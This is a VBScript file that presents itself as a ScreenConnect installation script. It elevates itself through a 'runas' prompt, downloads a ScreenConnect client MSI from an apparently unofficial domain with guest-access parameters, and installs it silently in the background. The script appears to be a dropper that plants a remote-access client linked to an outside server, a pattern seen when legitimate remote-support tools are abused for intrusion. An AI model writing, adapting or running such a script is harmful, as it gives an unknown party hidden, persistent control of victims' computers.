' ScreenConnect Installation Script with Debugging
' Run as Administrator for best results

' Check if running with elevation (simple method)
If WScript.Arguments.Length = 0 Then
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 1
    WScript.Quit
End If

' Define paths

msiUrl = "https://server.geriolk-itop.cc/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
destPath = "C:\Windows\Temp\ScreenConnect.ClientSetup.msi"
destFolder = "C:\Windows\Temp"
logFile = "C:\Windows\Temp\ScreenConnect_Install.log"

' Create logging function
Sub LogMessage(msg)
    On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set logStream = fso.OpenTextFile(logFile, 8, True)
    logStream.WriteLine Now & " - " & msg
    logStream.Close
    On Error Goto 0
End Sub

' Start installation
LogMessage "=== ScreenConnect Installation Started ==="
LogMessage "Script running as: " & CreateObject("WScript.Network").UserName

' Create FileSystemObject
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
If Err.Number <> 0 Then
    LogMessage "FATAL: Cannot create FileSystemObject - " & Err.Description
    WScript.Quit 1
End If
On Error Goto 0

' Create destination folder if needed
If Not fso.FolderExists(destFolder) Then
    On Error Resume Next
    fso.CreateFolder destFolder
    If Err.Number <> 0 Then
        LogMessage "ERROR: Cannot create folder " & destFolder & " - " & Err.Description
        WScript.Quit 1
    End If
    On Error Goto 0
    LogMessage "Created folder: " & destFolder
Else
    LogMessage "Folder exists: " & destFolder
End If

' Delete old MSI if it exists
If fso.FileExists(destPath) Then
    On Error Resume Next
    fso.DeleteFile destPath, True
    If Err.Number <> 0 Then
        LogMessage "WARNING: Could not delete existing file - " & Err.Description
    Else
        LogMessage "Deleted existing MSI file"
    End If
    On Error Goto 0
End If

' Create WinHttpRequest object
On Error Resume Next
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If Err.Number <> 0 Then
    LogMessage "ERROR: Cannot create WinHttpRequest - " & Err.Description
    LogMessage "Trying alternate method..."
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    If Err.Number <> 0 Then
        LogMessage "FATAL: Cannot create any HTTP object - " & Err.Description
        WScript.Quit 1
    End If
End If
On Error Goto 0

LogMessage "HTTP object created successfully"

' Configure HTTP request
On Error Resume Next
http.Open "GET", msiUrl, False
http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
http.Send

If Err.Number <> 0 Then
    LogMessage "ERROR: HTTP request failed - " & Err.Description
    WScript.Quit 1
End If
On Error Goto 0

LogMessage "HTTP request completed with status: " & http.Status

' Check HTTP response
If http.Status = 200 Then
    LogMessage "Download successful, saving file..."
    
    ' Create ADODB Stream for binary file
    On Error Resume Next
    Set stream = CreateObject("ADODB.Stream")
    If Err.Number <> 0 Then
        LogMessage "ERROR: Cannot create ADODB.Stream - " & Err.Description
        LogMessage "This may be blocked by antivirus or system policy"
        WScript.Quit 1
    End If
    
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile destPath, 2 ' Overwrite if exists
    stream.Close
    
    If Err.Number <> 0 Then
        LogMessage "ERROR: Cannot save file to " & destPath & " - " & Err.Description
        WScript.Quit 1
    End If
    On Error Goto 0
    
    ' Verify file was created
    If fso.FileExists(destPath) Then
        fileSize = fso.GetFile(destPath).Size
        LogMessage "File saved successfully: " & destPath
        LogMessage "File size: " & fileSize & " bytes"
        
        If fileSize < 1000 Then
            LogMessage "WARNING: File size seems too small, may be incomplete"
        End If
    Else
        LogMessage "ERROR: File was not created at " & destPath
        WScript.Quit 1
    End If
Else
    LogMessage "ERROR: HTTP request failed with status " & http.Status
    LogMessage "Status text: " & http.StatusText
    WScript.Quit 1
End If

' Run MSI installer
LogMessage "Starting MSI installation..."
Set shell = CreateObject("WScript.Shell")

' Build msiexec command with logging
msiCommand = "msiexec /i """ & destPath & """ /qn /norestart /l*v """ & "C:\Windows\Temp\ScreenConnect_MSI.log" & """"
LogMessage "Command: " & msiCommand

On Error Resume Next
returnCode = shell.Run(msiCommand, 0, True)
If Err.Number <> 0 Then
    LogMessage "ERROR: Failed to execute msiexec - " & Err.Description
    WScript.Quit 1
End If
On Error Goto 0

LogMessage "MSI installation completed with exit code: " & returnCode

' Interpret common exit codes
Select Case returnCode
    Case 0
        LogMessage "SUCCESS: Installation completed successfully"
    Case 1641
        LogMessage "SUCCESS: Installation completed, restart initiated"
    Case 3010
        LogMessage "SUCCESS: Installation completed, restart required"
    Case 1602
        LogMessage "ERROR: Installation cancelled by user"
    Case 1603
        LogMessage "ERROR: Fatal error during installation"
    Case 1618
        LogMessage "ERROR: Another installation is in progress"
    Case 1619
        LogMessage "ERROR: Installation package could not be opened"
    Case 1625
        LogMessage "ERROR: Installation forbidden by system policy"
    Case Else
        LogMessage "WARNING: Installation completed with code " & returnCode
End Select

' Optional: Clean up downloaded MSI
' Uncomment the next 3 lines if you want to delete the MSI after installation
' On Error Resume Next
' fso.DeleteFile destPath, True
' On Error Goto 0

LogMessage "=== Installation Script Completed ==="
LogMessage ""

WScript.Quit returnCode